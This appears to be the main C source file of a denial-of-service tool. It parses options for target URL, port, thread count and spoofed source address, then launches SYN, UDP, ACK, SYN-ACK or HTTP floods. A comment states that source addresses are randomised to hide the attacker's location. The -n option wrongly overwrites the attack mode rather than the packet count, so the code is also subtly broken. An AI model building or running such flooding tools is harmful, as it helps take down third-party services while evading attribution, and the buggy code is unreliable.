#include <stdlib.h> // for exit and atoi
#include <stdio.h>  // for printf
#include <signal.h> // for signal
#include <string.h> // for strncpy
#include <getopt.h> // for getopt_long
#include <limits.h>

#include "main.h"

/* from version.c */
extern void version_show(void);

/* from logger.c */
extern void info(const char *fmt, ...);
extern void warning(const char *fmt, ...);
extern void error(const char *fmt, ...);

extern void wronginput(const char *input_parameter);

/* usage.c */
extern void usage(void);

/* attack function */
extern int syn_flood_attack(char *url, int port, ...);
extern int udp_flood_attack(char *url, int port, ...);
extern int ack_flood_attack(char *url, int port, ...);
extern int syn_ack_joint_flood_attack(char *url, int port, ...);
extern int http_flood_attack(char *url, int port, ...);

void quit(int sig)
{
    info("exit program now...");
    exit(0);
}

int main(int argc, char *argv[])
{
    /*
     * main function here, do some parameters parse work
     * this program must run as root
     */

    signal(SIGINT, quit);
    signal(SIGSEGV, quit);
    signal(SIGTERM, quit);

    version_show();
    info("running...");

#ifdef DEBUG
    warning("debug mode");
#endif

    static char *option_string = "u:p:a:n:t:h";
    int option_index = 0;
    int c;
    static struct option long_options[] = {
        {"url", required_argument, NULL, 'u'},
        {"port", required_argument, NULL, 'p'},
        {"am", required_argument, NULL, 'a'},
        {"pn", required_argument, NULL, 'n'},
        {"thread", required_argument, NULL, 't'},
        {"help", no_argument, NULL, 'h'},
        {"saddr", required_argument, NULL, 1},
        {"sport", required_argument, NULL, 2},
        {"rsrc", no_argument, NULL, 3},
        {"rt", required_argument, NULL, 4},
        {"udps", no_argument, NULL, 5},
        {"udpp", no_argument, NULL, 6},
        {"https", no_argument, NULL, 7},
        {"request", required_argument, NULL, 8},
        {0, 0, 0, 0},
    };

    char url[MAX_URL_LENGTH] = {'\0'};
    int port = HTTP_PORT_DEFAULT;
    int attack_mode = NON_ATTACK;
    unsigned int pn = (unsigned int)PACKET_NUMBER_DEFAULT;

    char saddr[MAX_IP_LENGTH] = {'\0'};
    strcpy(saddr, ATTACK_SOURCE_IP_DEFAULT);
    int sport = ATTACK_SOURCE_PORT_DEFAULT;
    int rdsrc = ENABLE; // random source address to hide attacker's location (syn flood)
    int thread_number = THREAD_NUM_DEFAULT;
    int rt = RANDOM_SOURCE_ADDRESS_REPETITION_DEFAULT;
    int udps = DISABLE;
    int udpp = DISABLE;
    int https = HTTP;
    char request[MAX_PATH_LENGTH] = {'\0'};

    while (1)
    {
        c = getopt_long(argc, argv, option_string, long_options, &option_index);
        if (c == -1)
            break;

        switch (c)
        {
        case 'u':
            strncpy(url, optarg, MAX_URL_LENGTH);
            break;
        case 'p':
            if (atoi(optarg) != 0)
                port = atoi(optarg);
            else
                wronginput("-p or --port"); 
            break;
        case 'a':
            if (atoi(optarg) != 0)
                attack_mode = atoi(optarg);
            else
                wronginput("-a or --attack-mode"); 
            break;
        case 'n':
            if (atol(optarg) != 0)
                attack_mode = (unsigned int)atol(optarg);
            else
                wronginput("-n or --packet-number"); 
            break;
        case 't':
            if (atoi(optarg) != 0)
                thread_number = atoi(optarg);
            else
                wronginput("-t or --thread");
            break;
        case 'h':
            usage();
            break;
        case 1:
            memset(saddr, 0, MAX_IP_LENGTH);
            strncpy(saddr, optarg, MAX_IP_LENGTH);
            break;
        case 2:
            if (atoi(optarg) != 0)
                sport = atoi(optarg);
            else
                wronginput("--src-port");
            break;
        case 3:
            rdsrc = ENABLE;
            break;
        case 4:
            if (atoi(optarg) != 0)
                rt = atoi(optarg);
            else
                wronginput("--repeat-times");
            break;
        case 5:
            udps = ENABLE;
            break;
        case 6:
            udpp = ENABLE;
            break;
        case 7:
            https = HTTPS;
            break;
        case 8:
            strncpy(request, optarg, MAX_PATH_LENGTH);
            break;
        case '?':
            wronginput(NULL);
        }
    }

    if (strlen(url) == 0)
    {
        wronginput("-u or --url");
    }

    if (attack_mode == NON_ATTACK)
    {
        wronginput("-a or --attck-mode");
    }

    switch (attack_mode)
    {
    case SYN_FLOOD_ATTACK:
        syn_flood_attack(url, port, rdsrc, rt, thread_number, saddr, sport, pn);
        break;
    case UDP_FLOOD_ATTACK:
        udp_flood_attack(url, port, rdsrc, rt, thread_number, saddr, sport, udps ,udpp);
        break;
    case ACK_FLOOD_ATTACK:
        ack_flood_attack(url, port ,rdsrc, rt, thread_number, saddr, sport, pn);
        break;
    case SYN_ACK_JOINT_FLOOD_ATTACK:
        syn_ack_joint_flood_attack(url, port, rdsrc, rt, thread_number, saddr, sport, pn);
        break;
    case HTTP_FLOOD_ATTACK:
        http_flood_attack(url, port, request, https, thread_number, pn);
        break;
    default:
        wronginput("-a or --attack-mode");
    }

    return 0;
}